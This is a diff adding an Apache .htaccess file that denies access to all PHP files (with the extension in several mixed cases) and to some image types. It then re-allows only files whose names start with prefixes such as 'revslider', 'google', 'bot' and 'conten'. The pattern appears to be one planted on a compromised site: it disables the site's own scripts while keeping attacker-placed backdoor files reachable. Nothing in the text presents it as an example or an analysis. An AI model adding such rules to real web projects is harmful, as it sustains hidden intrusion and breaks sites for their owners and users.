@@ -1,0 +1,30 @@
+<Files ~ "\.(j|php|php3|php5|php4|phtml|gif|png|phpgif|pHp|PHP|PhP|PHp|pHP)$">
+deny from all
+</Files>
+<Files "ind*">
+Allow from all
+</Files>
+<Files "coi*">
+Allow from all
+</Files>
+<Files "revslider*">
+Allow from all
+</Files>
+<Files "mag*">
+Allow from all
+</Files>
+<Files "google*">
+Allow from all
+</Files>
+<Files "option*">
+Allow from all
+</Files>
+<Files "conten*">
+Allow from all
+</Files>
+<Files "bot*">
+Allow from all
+</Files>
+<Files "error*">
+Allow from all
+</Files>
